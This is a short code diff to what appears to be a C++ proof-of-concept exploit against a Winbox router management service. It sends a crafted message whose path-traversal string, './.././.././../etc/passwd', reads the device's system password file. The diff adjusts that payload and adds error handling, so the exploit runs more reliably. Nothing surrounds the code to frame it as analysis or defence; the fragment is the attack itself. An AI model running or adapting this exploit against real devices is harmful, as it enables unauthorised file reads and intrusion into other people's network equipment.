@@ -113,13 +113,19 @@ int main(int p_argc, const char** p_argv)
     msg.set_command(7);
     msg.set_request_id(1);
     msg.set_reply_expected(true);
-    msg.add_string(1, "//./.././.././../etc/passwd");
+    msg.add_string(1, "./.././.././../etc/passwd");
     winboxSession.send(msg);
 
     msg.reset();
     if (!winboxSession.receive(msg))
     {
         std::cerr << "Error receiving a response." << std::endl;
+        return EXIT_FAILURE;
+    }
+
+    if (msg.has_error())
+    {
+        std::cerr << msg.get_error_string() << std::endl;
         return EXIT_FAILURE;
     }
 
